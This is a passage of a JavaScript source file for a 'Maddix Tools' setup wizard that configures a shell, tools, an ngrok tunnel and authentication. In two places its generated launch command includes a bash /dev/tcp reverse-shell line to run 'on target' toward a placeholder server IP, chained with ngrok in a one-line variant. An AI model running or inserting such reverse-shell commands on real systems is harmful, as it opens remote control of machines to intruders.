              <input id="ew-auth-user-input" type="text" value="${esc(state.authUsername)}" placeholder="admin" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;box-sizing:border-box" dir="ltr">
            </div>
            <div>
              <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('auth_password_label')}</label>
              <input id="ew-auth-pass-input" type="password" value="${esc(state.authPassword)}" placeholder="••••••••" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;box-sizing:border-box" dir="ltr">
            </div>
          </div>
          <div style="margin-bottom:12px">
            <div style="display:flex;justify-content:space-between;font-size:.78rem;margin-bottom:4px">
              <span style="color:var(--muted-foreground,#64748b)">${txt('auth_password_label')} ${txt('auth_strength_' + ['weak','weak','medium','strong','strong'][Math.min(strength, 4)])}</span>
              <span style="color:${strengthColors[Math.min(strength, 2)] || '#ef4444'}">${strengthLabels[Math.min(strength, 2)] || strengthLabels[0]}</span>
            </div>
            <div style="height:4px;border-radius:2px;background:var(--border,#334155);overflow:hidden">
              <div style="height:100%;width:${strengthPct[Math.min(strength, 2)] || '0%'};background:${strengthColors[Math.min(strength, 2)] || '#ef4444'};border-radius:2px;transition:all .3s"></div>
            </div>
          </div>
        </div>
        <div id="ew-auth-api" style="display:${state.authMethod==='api'?'block':'none'}">
          <div>
            <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('auth_api')}</label>
            <div style="display:flex;gap:8px">
              <input id="ew-auth-api-input" type="text" value="${esc(state.authAPIKey)}" readonly style="flex:1;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;font-family:monospace;cursor:default" dir="ltr">
              <button id="ew-auth-api-copy" style="padding:8px 14px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);cursor:pointer;font-size:.8rem">${txt('auth_copy')}</button>
              <button id="ew-auth-api-gen" style="padding:8px 14px;border-radius:8px;border:1px solid var(--accent,#6366f1);background:var(--accent,#6366f1);color:#fff;cursor:pointer;font-size:.8rem">${txt('auth_generate')}</button>
            </div>
          </div>
        </div>
        <div style="margin-top:16px;display:flex;flex-direction:column;gap:12px">
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:.85rem">
            <input type="checkbox" id="ew-auth-require" ${state.authRequireAll?'checked':''} style="width:16px;height:16px;accent-color:var(--accent,#6366f1);cursor:pointer"> ${txt('auth_require_all')}
          </label>
          <div>
            <label style="display:block;font-size:.85rem;font-weight:600;margin-bottom:4px">${txt('auth_auto_ip')}</label>
            <input id="ew-auth-autoip" type="text" value="${esc(state.authAutoIP)}" placeholder="192.168.1.0/24" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);font-size:.9rem;outline:none;box-sizing:border-box" dir="ltr">
          </div>
        </div>
      </div>
    </div>`;
  }

  function renderStep5() {
    const selectedTools = TOOLS_DATA.filter(t => state.tools.includes(t.id));
    const shellInfo = SHELLS.find(s => s.id === state.shell) || SHELLS[2];
    const shellName = lang === 'fa' ? shellInfo.name_fa : shellInfo.name_en;
    const tunnelType = state.ngrokTunnelType.toUpperCase();

    const ngrokCmdParts = [];
    ngrokCmdParts.push(`ngrok ${state.ngrokTunnelType}`);
    if (state.ngrokRegion && state.ngrokRegion !== 'us') {
      ngrokCmdParts.push(`--region=${state.ngrokRegion}`);
    }
    if (state.ngrokSubdomain && state.ngrokTunnelType === 'http') {
      ngrokCmdParts.push(`--subdomain=${state.ngrokSubdomain}`);
    }
    if (state.ngrokDomain) {
      ngrokCmdParts.push(`--domain=${state.ngrokDomain}`);
    }
    if (state.ngrokToken) {
      ngrokCmdParts.push(`--authtoken=${state.ngrokToken}`);
    }
    ngrokCmdParts.push(`localhost:${state.ngrokPort}`);

    let authValue = '';
    switch (state.authMethod) {
      case 'secret': authValue = state.authCustomToken || state.authSecretToken; break;
      case 'ssh': authValue = state.authSSHKey.length > 50 ? state.authSSHKey.substring(0, 50) + '...' : state.authSSHKey || '-'; break;
      case 'password': authValue = state.authUsername ? `${state.authUsername}:****` : '-'; break;
      case 'api': authValue = state.authAPIKey; break;
    }

    const combinedCmd = `# Maddix Tools - Remote Environment Launch Command
# Shell: ${shellName}
# Tools: ${selectedTools.map(t => t.name).join(', ')}

# 1. Start ngrok tunnel
${ngrokCmdParts.join(' ')}

# 2. For reverse shell access, use the following on target:
# bash -i >& /dev/tcp/YOUR_SERVER_IP/${state.ngrokPort} 0>&1

# 3. Auth token (${state.authMethod}):
# ${authValue}

# To run everything in one line (Linux/Mac):
# ${ngrokCmdParts.join(' ')} & sleep 3 && bash -i >& /dev/tcp/YOUR_SERVER_IP/${state.ngrokPort} 0>&1`;

    const isConfigured = state.ngrokToken && state.tools.length > 0;

    return `<div class="ew-step" data-ew-step="5">
      <div style="text-align:center;margin-bottom:20px">
        <div style="font-size:2rem;margin-bottom:8px">${txt('step_emoji5')}</div>
        <h3 style="margin:0;font-size:1.2rem;font-weight:700">${txt('summary_title')}</h3>
      </div>
      <div style="max-width:600px;margin:0 auto;display:flex;flex-direction:column;gap:12px">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
          <div style="padding:14px;border-radius:10px;background:var(--card,#1e1e2e);border:1px solid var(--border,#334155)">
            <div style="font-size:.7rem;text-transform:uppercase;letter-spacing:.05em;color:var(--muted-foreground,#64748b);margin-bottom:4px">${txt('summary_shell')}</div>
            <div style="font-size:1rem;font-weight:700">${shellInfo.icon} ${shellName}</div>
          </div>
          <div style="padding:14px;border-radius:10px;background:var(--card,#1e1e2e);border:1px solid var(--border,#334155)">
            <div style="font-size:.7rem;text-transform:uppercase;letter-spacing:.05em;color:var(--muted-foreground,#64748b);margin-bottom:4px">${txt('summary_tools')}</div>
            <div style="font-size:1rem;font-weight:700">${selectedTools.length} ${txt('summary_tools_count')}</div>
            <div style="font-size:.75rem;color:var(--muted-foreground,#64748b);margin-top:2px;display:flex;flex-wrap:wrap;gap:3px">${selectedTools.slice(0, 8).map(t => `<span style="background:rgba(99,102,241,.12);padding:1px 6px;border-radius:4px;font-size:.7rem">${t.name}</span>`).join('')}${selectedTools.length > 8 ? `<span style="font-size:.7rem;color:var(--muted-foreground,#64748b)">+${selectedTools.length - 8}</span>` : ''}</div>
          </div>
        </div>
        <div style="padding:14px;border-radius:10px;background:var(--card,#1e1e2e);border:1px solid var(--border,#334155)">
          <div style="font-size:.7rem;text-transform:uppercase;letter-spacing:.05em;color:var(--muted-foreground,#64748b);margin-bottom:8px">${txt('summary_ngrok')}</div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:.85rem">
            <div><span style="color:var(--muted-foreground,#64748b)">${txt('summary_ngrok_token')}:</span> ${state.ngrokToken ? '✅' : '❌'}</div>
            <div><span style="color:var(--muted-foreground,#64748b)">${txt('summary_ngrok_tunnel')}:</span> ${tunnelType}</div>
            <div><span style="color:var(--muted-foreground,#64748b)">${txt('summary_ngrok_port')}:</span> ${state.ngrokPort}</div>
            <div><span style="color:var(--muted-foreground,#64748b)">${txt('summary_ngrok_region')}:</span> ${state.ngrokRegion.toUpperCase()}</div>
          </div>
          ${state.ngrokDomain ? `<div style="font-size:.8rem;margin-top:4px"><span style="color:var(--muted-foreground,#64748b)">${txt('ngrok_custom_domain')}:</span> ${esc(state.ngrokDomain)}</div>` : ''}
        </div>
        <div style="padding:14px;border-radius:10px;background:var(--card,#1e1e2e);border:1px solid var(--border,#334155)">
          <div style="font-size:.7rem;text-transform:uppercase;letter-spacing:.05em;color:var(--muted-foreground,#64748b);margin-bottom:8px">${txt('summary_auth')}</div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:.85rem">
            <div><span style="color:var(--muted-foreground,#64748b)">${txt('summary_auth_method')}:</span> ${txt('auth_'+state.authMethod)}</div>
            <div><span style="color:var(--muted-foreground,#64748b)">${txt('summary_auth_value')}:</span> <span style="font-family:monospace;font-size:.78rem;word-break:break-all">${esc(authValue)}</span></div>
          </div>
          ${state.authRequireAll ? `<div style="font-size:.8rem;margin-top:4px;color:var(--muted-foreground,#64748b)">${txt('auth_require_all')}: ✅</div>` : ''}
          ${state.authAutoIP ? `<div style="font-size:.8rem;margin-top:2px"><span style="color:var(--muted-foreground,#64748b)">${txt('auth_auto_ip')}:</span> ${esc(state.authAutoIP)}</div>` : ''}
        </div>
        <div style="padding:14px;border-radius:10px;background:var(--card,#1e1e2e);border:1px solid var(--border,#334155)">
          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
            <span style="font-size:.7rem;text-transform:uppercase;letter-spacing:.05em;color:var(--muted-foreground,#64748b)">${txt('summary_launch_command')}</span>
            <span style="font-size:.7rem;color:var(--muted-foreground,#64748b)">${txt('copy_title')}</span>
          </div>
          <div style="position:relative">
            <textarea id="ew-launch-command" rows="6" readonly style="width:100%;padding:12px;padding-right:${isRtl?'auto':'40px'};padding-left:${isRtl?'40px':'auto'};border-radius:8px;border:1px solid var(--border,#334155);background:#0a0a0f;color:#22c55e;font-size:.78rem;font-family:monospace;outline:none;resize:none;box-sizing:border-box;line-height:1.5;cursor:default" dir="ltr">${esc(combinedCmd)}</textarea>
            <button id="ew-copy-cmd" style="position:absolute;top:8px;${isRtl?'left':'right'}:8px;padding:4px 8px;border-radius:4px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);cursor:pointer;font-size:.72rem">${txt('copy_command')}</button>
          </div>
        </div>
        <div style="display:flex;flex-wrap:wrap;gap:10px;justify-content:center;margin-top:4px">
          <button id="ew-download-config" style="padding:10px 20px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);cursor:pointer;font-size:.85rem;display:flex;align-items:center;gap:6px">
            <span>⬇️</span> ${txt('download_config')}
          </button>
          <button id="ew-connect-web" style="padding:10px 20px;border-radius:8px;border:1px solid var(--accent,#6366f1);background:var(--accent,#6366f1);color:#fff;cursor:pointer;font-size:.85rem;display:flex;align-items:center;gap:6px">
            <span>🌐</span> ${txt('connect_web')}
          </button>
        </div>
        <div style="text-align:center;padding:8px;font-size:.75rem;color:var(--muted-foreground,#64748b)">
          ${txt('qr_hint')}
        </div>
      </div>
    </div>`;
  }

  return `<div dir="${dir}" style="display:flex;flex-direction:column;gap:0">
    <style>
      .ew-step { animation: ewFadeIn .3s ease }
      @keyframes ewFadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
      .ew-cat-tab.active { background:var(--accent,#6366f1)!important;color:#fff!important;border-color:var(--accent,#6366f1)!important }
      .ew-cat-tab:hover { border-color:var(--accent,#6366f1)!important }
      #ew-root ::-webkit-scrollbar { width:6px;height:6px }
      #ew-root ::-webkit-scrollbar-track { background:transparent }
      #ew-root ::-webkit-scrollbar-thumb { background:var(--border,#334155);border-radius:3px }
    </style>
    <div id="ew-root">
      ${renderStepIndicator(state.step)}
      <div style="min-height:300px;overflow-y:auto;padding:0 4px">
        ${state.step === 1 ? renderStep1() : ''}
        ${state.step === 2 ? renderStep2() : ''}
        ${state.step === 3 ? renderStep3() : ''}
        ${state.step === 4 ? renderStep4() : ''}
        ${state.step === 5 ? renderStep5() : ''}
      </div>
      <div style="display:flex;gap:10px;justify-content:${isRtl?'flex-start':'flex-end'};margin-top:20px;padding-top:16px;border-top:1px solid var(--border,#334155)">
        ${state.step > 1 ? `<button id="ew-back-btn" style="padding:10px 20px;border-radius:8px;border:1px solid var(--border,#334155);background:var(--card,#1e1e2e);color:var(--foreground,#c0caf5);cursor:pointer;font-size:.9rem;display:flex;align-items:center;gap:6px">
          ${isRtl ? '' : '←'} ${txt('back')} ${isRtl ? '→' : ''}
        </button>` : '<div></div>'}
        ${state.step < 5 ? `<button id="ew-next-btn" style="padding:10px 24px;border-radius:8px;border:1px solid var(--accent,#6366f1);background:var(--accent,#6366f1);color:#fff;cursor:pointer;font-size:.9rem;display:flex;align-items:center;gap:6px">
          ${txt('next')} ${isRtl ? '←' : '→'}
        </button>` : `<button id="ew-finish-btn" style="padding:10px 24px;border-radius:8px;border:1px solid #22c55e;background:#22c55e;color:#fff;cursor:pointer;font-size:.9rem;display:flex;align-items:center;gap:6px">
          ✅ ${txt('finish')}
        </button>`}
      </div>
    </div>
  </div>`;
}

export function init(lang) {
  const t = L[lang] || L.en;
  const isRtl = lang === 'fa';
  const root = document.getElementById('ew-root');
  if (!root) return;

  let state = getInitialState();

  function saveState() {
    try { localStorage.setItem('ew-state', JSON.stringify(state)); } catch(e) {}
  }

  function goToStep(step) {
    if (step < 1 || step > 5) return;
    state.step = step;
    saveState();
    const content = document.querySelector('#drawerBody > div');
    if (content) {
      const mod = render(lang);
      content.innerHTML = mod;
      init(lang);
    }
  }

  function getLaunchCommand() {
    const shellInfo = SHELLS.find(s => s.id === state.shell) || SHELLS[2];
    const shellName = lang === 'fa' ? shellInfo.name_fa : shellInfo.name_en;
    const selectedTools = TOOLS_DATA.filter(t => state.tools.includes(t.id));
    const ngrokCmd = buildNgrokCmd();
    let authValue = '';
    switch (state.authMethod) {
      case 'secret': authValue = state.authCustomToken || state.authSecretToken; break;
      case 'ssh': authValue = state.authSSHKey || '-'; break;
      case 'password': authValue = state.authUsername ? `${state.authUsername}:****` : '-'; break;
      case 'api': authValue = state.authAPIKey; break;
    }
    return `# Maddix Tools - Remote Environment Launch Command
# Shell: ${shellName}
# Tools: ${selectedTools.map(t => t.name).join(', ')}

# 1. Start ngrok tunnel
${ngrokCmd}

# 2. For reverse shell access, use the following on target:
# bash -i >& /dev/tcp/YOUR_SERVER_IP/${state.ngrokPort} 0>&1

# 3. Auth token (${state.authMethod}):
# ${authValue}

# To run everything in one line (Linux/Mac):
# ${ngrokCmd} & sleep 3 && bash -i >& /dev/tcp/YOUR_SERVER_IP/${state.ngrokPort} 0>&1`;
  }

  function buildNgrokCmd() {
    const parts = [];
    parts.push(`ngrok ${state.ngrokTunnelType}`);
    if (state.ngrokRegion && state.ngrokRegion !== 'us') parts.push(`--region=${state.ngrokRegion}`);
    if (state.ngrokSubdomain && state.ngrokTunnelType === 'http') parts.push(`--subdomain=${state.ngrokSubdomain}`);
    if (state.ngrokDomain) parts.push(`--domain=${state.ngrokDomain}`);
    if (state.ngrokToken) parts.push(`--authtoken=${state.ngrokToken}`);
    parts.push(`localhost:${state.ngrokPort}`);
    return parts.join(' ');
  }

  function getConfigJSON() {
    return {
      shell: state.shell,
      tools: state.tools,
      ngrok: {
        token: state.ngrokToken,
        tunnelType: state.ngrokTunnelType,
        port: state.ngrokPort,
        region: state.ngrokRegion,
        domain: state.ngrokDomain,
        subdomain: state.ngrokSubdomain,
      },
      auth: {
        method: state.authMethod,
        secretToken: state.authMethod === 'secret' ? (state.authCustomToken || state.authSecretToken) : '',
        sshKey: state.authMethod === 'ssh' ? state.authSSHKey : '',
        username: state.authMethod === 'password' ? state.authUsername : '',
        password: state.authMethod === 'password' ? state.authPassword : '',
        apiKey: state.authMethod === 'api' ? state.authAPIKey : '',
        requireAll: state.authRequireAll,
        autoIP: state.authAutoIP,
      },
      launchCommand: getLaunchCommand(),
      createdAt: new Date().toISOString(),
    };
  }

  // ── Step circles ──
  root.querySelectorAll('[data-ew-step-circle]').forEach(el => {
    el.addEventListener('click', () => {
      const step = parseInt(el.getAttribute('data-ew-goto'), 10);
      if (step >= 1 && step <= 5) goToStep(step);
    });
  });

  // ── Back / Next / Finish ──
  const backBtn = document.getElementById('ew-back-btn');
  const nextBtn = document.getElementById('ew-next-btn');
  const finishBtn = document.getElementById('ew-finish-btn');

  if (backBtn) backBtn.addEventListener('click', () => goToStep(state.step - 1));
  if (nextBtn) nextBtn.addEventListener('click', () => goToStep(state.step + 1));
  if (finishBtn) finishBtn.addEventListener('click', () => {
    const cmd = getLaunchCommand();
    try { navigator.clipboard.writeText(cmd); } catch(e) {}
    const btn = document.getElementById('ew-finish-btn');
    if (btn) {
      btn.textContent = '✅ ' + t.copied;
      setTimeout(() => { btn.textContent = '✅ ' + t.finish; }, 2000);
    }
  });

  // ── Step 1: Shell selection ──
  root.querySelectorAll('[data-ew-shell]').forEach(el => {
    el.addEventListener('click', () => {
      const shell = el.getAttribute('data-ew-shell');
      state.shell = shell;
      saveState();
      root.querySelectorAll('[data-ew-shell]').forEach(c => {
        const selected = c.getAttribute('data-ew-shell') === shell;
        c.style.borderColor = selected ? 'var(--accent,#6366f1)' : 'var(--border,#334155)';
        c.style.background = selected ? 'rgba(99,102,241,.1)' : 'var(--card,#1e1e2e)';
      });
    });
  });

  // ── Step 2: Tool toggles ──
  root.querySelectorAll('[data-ew-tool]').forEach(el => {
    el.addEventListener('change', () => {
      const id = el.getAttribute('data-ew-tool');
      if (el.checked) {
        if (!state.tools.includes(id)) state.tools.push(id);
        const label = root.querySelector(`[data-ew-tool-label="${id}"]`);
        if (label) { label.style.borderColor = 'var(--accent,#6366f1)'; label.style.background = 'rgba(99,102,241,.08)'; }
      } else {
        state.tools = state.tools.filter(t => t !== id);
        const label = root.querySelector(`[data-ew-tool-label="${id}"]`);
        if (label) { label.style.borderColor = 'var(--border,#334155)'; label.style.background = 'var(--card,#1e1e2e)'; }
      }
      saveState();
      updateToolCount();
    });
  });

  // ── Step 2: Select All / Deselect All ──
  root.querySelectorAll('.ew-sel-all').forEach(el => {
    el.addEventListener('click', () => {
      const cat = el.getAttribute('data-ew-cat');
      const tools = TOOLS_DATA.filter(t => t.cat === cat);
      tools.forEach(t => {
        if (!state.tools.includes(t.id)) state.tools.push(t.id);
        const cb = root.querySelector(`[data-ew-tool="${t.id}"]`);
        if (cb) cb.checked = true;
        const label = root.querySelector(`[data-ew-tool-label="${t.id}"]`);
        if (label) { label.style.borderColor = 'var(--accent,#6366f1)'; label.style.background = 'rgba(99,102,241,.08)'; }
      });
      saveState();
      updateToolCount();
    });
  });

  root.querySelectorAll('.ew-sel-none').forEach(el => {
    el.addEventListener('click', () => {
      const cat = el.getAttribute('data-ew-cat');
      const tools = TOOLS_DATA.filter(t => t.cat === cat);
      tools.forEach(t => {
        state.tools = state.tools.filter(id => id !== t.id);
        const cb = root.querySelector(`[data-ew-tool="${t.id}"]`);
        if (cb) cb.checked = false;
        const label = root.querySelector(`[data-ew-tool-label="${t.id}"]`);
        if (label) { label.style.borderColor = 'var(--border,#334155)'; label.style.background = 'var(--card,#1e1e2e)'; }
      });
      saveState();
      updateToolCount();
    });
  });

  function updateToolCount() {
    const countEl = document.getElementById('ew-tool-count');
    if (countEl) countEl.textContent = `${state.tools.length} ${t.selected_count}`;
  }

  // ── Step 2: Category tabs ──
  root.querySelectorAll('.ew-cat-tab').forEach(el => {
    el.addEventListener('click', () => {
      root.querySelectorAll('.ew-cat-tab').forEach(b => b.classList.remove('active'));
      el.classList.add('active');
      const cat = el.getAttribute('data-ew-cat');
      root.querySelectorAll('[data-ew-cat-panel]').forEach(p => {
        p.style.display = p.getAttribute('data-ew-cat-panel') === cat ? 'block' : 'none';
      });
    });
  });

  // ── Step 3: Ngrok token show/hide ──
  const ngrokInput = document.getElementById('ew-ngrok-token-input');
  const ngrokToggle = document.getElementById('ew-ngrok-toggle');
  if (ngrokToggle && ngrokInput) {
    ngrokToggle.addEventListener('click', () => {
      if (ngrokInput.type === 'password') {
        ngrokInput.type = 'text';
        ngrokToggle.textContent = t.ngrok_hide;
      } else {
        ngrokInput.type = 'password';
        ngrokToggle.textContent = t.ngrok_show;
      }
    });
    ngrokInput.addEventListener('input', () => {
      state.ngrokToken = ngrokInput.value;
      state.ngrokTokenStatus = 'required';
      saveState();
      updateNgrokStatus();
    });
  }

  function updateNgrokStatus() {
    const statusEl = document.getElementById('ew-ngrok-status');
    if (!statusEl) return;
    const icons = { required: '⚪', valid: '🟢', invalid: '🔴' };
    const colors = { required: 'var(--muted-foreground,#64748b)', valid: '#22c55e', invalid: '#ef4444' };
    statusEl.innerHTML = `<span>${icons[state.ngrokTokenStatus] || '⚪'}</span><span>${t['ngrok_token_' + state.ngrokTokenStatus]}</span>`;
    statusEl.style.color = colors[state.ngrokTokenStatus] || colors.required;
  }

  // ── Step 3: Ngrok test token ──
  const testBtn = document.getElementById('ew-ngrok-test');
  if (testBtn) {
    testBtn.addEventListener('click', () => {
      const token = state.ngrokToken;
      if (!token || token.length < 5) {
        state.ngrokTokenStatus = 'invalid';
      } else if (/^[0-9a-zA-Z_-]{20,}/.test(token)) {
        state.ngrokTokenStatus = 'valid';
      } else {
        state.ngrokTokenStatus = 'invalid';
      }
      saveState();
      updateNgrokStatus();
    });
  }

  // ── Step 3: Ngrok settings ──
  const ngrokType = document.getElementById('ew-ngrok-type');
  const ngrokPort = document.getElementById('ew-ngrok-port');
  const ngrokRegion = document.getElementById('ew-ngrok-region');
  const ngrokSubdomain = document.getElementById('ew-ngrok-subdomain');
  const ngrokDomain = document.getElementById('ew-ngrok-domain');

  if (ngrokType) ngrokType.addEventListener('change', () => { state.ngrokTunnelType = ngrokType.value; saveState(); });
  if (ngrokPort) ngrokPort.addEventListener('input', () => { state.ngrokPort = ngrokPort.value; saveState(); });
  if (ngrokRegion) ngrokRegion.addEventListener('change', () => { state.ngrokRegion = ngrokRegion.value; saveState(); });
  if (ngrokSubdomain) ngrokSubdomain.addEventListener('input', () => { state.ngrokSubdomain = ngrokSubdomain.value; saveState(); });
  if (ngrokDomain) ngrokDomain.addEventListener('input', () => { state.ngrokDomain = ngrokDomain.value; saveState(); });

  // ── Step 4: Auth method tabs ──
  root.querySelectorAll('[data-ew-auth-method]').forEach(el => {
    el.addEventListener('click', () => {
      const method = el.getAttribute('data-ew-auth-method');
      state.authMethod = method;
      saveState();
      root.querySelectorAll('[data-ew-auth-method]').forEach(b => {
        const active = b.getAttribute('data-ew-auth-method') === method;
        b.style.borderColor = active ? 'var(--accent,#6366f1)' : 'var(--border,#334155)';
        b.style.background = active ? 'rgba(99,102,241,.1)' : 'var(--card,#1e1e2e)';
      });
      ['secret','ssh','password','api'].forEach(m => {
        const panel = document.getElementById('ew-auth-' + m);
        if (panel) panel.style.display = m === method ? 'block' : 'none';
      });
    });
  });

  // ── Step 4: Secret token ──
  const secretCopy = document.getElementById('ew-auth-secret-copy');
  const secretGen = document.getElementById('ew-auth-secret-gen');
  const secretInput = document.getElementById('ew-auth-secret-input');
  const secretCustom = document.getElementById('ew-auth-secret-custom');

  if (secretCopy && secretInput) {
    secretCopy.addEventListener('click', () => {
      try { navigator.clipboard.writeText(secretInput.value); } catch(e) {}
      secretCopy.textContent = t.auth_copied;
      setTimeout(() => { secretCopy.textContent = t.auth_copy; }, 2000);
    });
  }
  if (secretGen && secretInput) {
    secretGen.addEventListener('click', () => {
      state.authSecretToken = generateToken(32);
      secretInput.value = state.authSecretToken;
      saveState();
    });
  }
  if (secretCustom) {
    secretCustom.addEventListener('input', () => { state.authCustomToken = secretCustom.value; saveState(); });
  }

  // ── Step 4: SSH key ──
  const sshInput = document.getElementById('ew-auth-ssh-input');
  const sshGen = document.getElementById('ew-auth-ssh-gen');
  const sshInstructions = document.getElementById('ew-auth-ssh-instructions');

  if (sshInput) sshInput.addEventListener('input', () => { state.authSSHKey = sshInput.value; saveState(); });
  if (sshGen) {
    sshGen.addEventListener('click', () => {
      if (sshInstructions) {
        const shown = sshInstructions.style.display !== 'none';
        sshInstructions.style.display = shown ? 'none' : 'block';
        sshGen.textContent = shown ? t.auth_generate_keypair : t.auth_generating;
        setTimeout(() => { sshGen.textContent = t.auth_generate_keypair; }, 1000);
      }
    });
  }

  // ── Step 4: Password auth ──
  const userInput = document.getElementById('ew-auth-user-input');
  const passInput = document.getElementById('ew-auth-pass-input');

  if (userInput) userInput.addEventListener('input', () => { state.authUsername = userInput.value; saveState(); });
  if (passInput) {
    passInput.addEventListener('input', () => {
      state.authPassword = passInput.value;
      saveState();
      updatePasswordStrength();
    });
  }

  function updatePasswordStrength() {
    const pw = state.authPassword;
    const strength = getPasswordStrength(pw);
    const labels = [t.auth_strength_weak, t.auth_strength_medium, t.auth_strength_strong];
    const colors = ['#ef4444', '#eab308', '#22c55e'];
    const pcts = ['33%', '66%', '100%'];
    const bar = passInput?.parentElement?.parentElement?.querySelector('div:last-child > div');
    const labelEl = passInput?.parentElement?.parentElement?.querySelector('div:first-child > span:last-child');
    if (bar) {
      bar.querySelector('div') ? (bar.querySelector('div').style.width = pcts[Math.min(strength, 2)] || '0%', bar.querySelector('div').style.background = colors[Math.min(strength, 2)] || '#ef4444') : null;
    }
    if (labelEl) labelEl.textContent = labels[Math.min(strength, 2)] || labels[0];
  }

  // ── Step 4: API key ──
  const apiCopy = document.getElementById('ew-auth-api-copy');
  const apiGen = document.getElementById('ew-auth-api-gen');
  const apiInput = document.getElementById('ew-auth-api-input');

  if (apiCopy && apiInput) {
    apiCopy.addEventListener('click', () => {
      try { navigator.clipboard.writeText(apiInput.value); } catch(e) {}
      apiCopy.textContent = t.auth_copied;
      setTimeout(() => { apiCopy.textContent = t.auth_copy; }, 2000);
    });
  }
  if (apiGen && apiInput) {
    apiGen.addEventListener('click', () => {
      state.authAPIKey = generateToken(48);
      apiInput.value = state.authAPIKey;
      saveState();
    });
  }

  // ── Step 4: Require auth toggle ──
  const requireCheck = document.getElementById('ew-auth-require');
  if (requireCheck) {
    requireCheck.addEventListener('change', () => {
      state.authRequireAll = requireCheck.checked;
      saveState();
    });
  }

  const autoIP = document.getElementById('ew-auth-autoip');
  if (autoIP) {
    autoIP.addEventListener('input', () => { state.authAutoIP = autoIP.value; saveState(); });
  }

  // ── Step 5: Copy command ──
  const copyCmd = document.getElementById('ew-copy-cmd');
  const cmdTextarea = document.getElementById('ew-launch-command');
  if (copyCmd && cmdTextarea) {
    copyCmd.addEventListener('click', () => {
      try { navigator.clipboard.writeText(cmdTextarea.value); } catch(e) {}
      copyCmd.textContent = t.copied;
      setTimeout(() => { copyCmd.textContent = t.copy_command; }, 2000);
    });
  }

  // ── Step 5: Download config ──
  const downloadBtn = document.getElementById('ew-download-config');
  if (downloadBtn) {
    downloadBtn.addEventListener('click', () => {
      const config = getConfigJSON();
      const blob = new Blob([JSON.stringify(config, null, 2)], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'maddix-env-config.json';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    });
  }

  // ── Step 5: Connect via Web ──
  const connectWeb = document.getElementById('ew-connect-web');
  if (connectWeb) {
    connectWeb.addEventListener('click', () => {
      if (state.ngrokToken && state.ngrokTokenStatus === 'valid') {
        const url = `https://dashboard.ngrok.com/tunnels/agents`;
        window.open(url, '_blank');
      } else {
        const url = `https://dashboard.ngrok.com`;
        window.open(url, '_blank');
      }
    });
  }

  // Initial UI state sync
  updateToolCount();
  updateNgrokStatus();
}
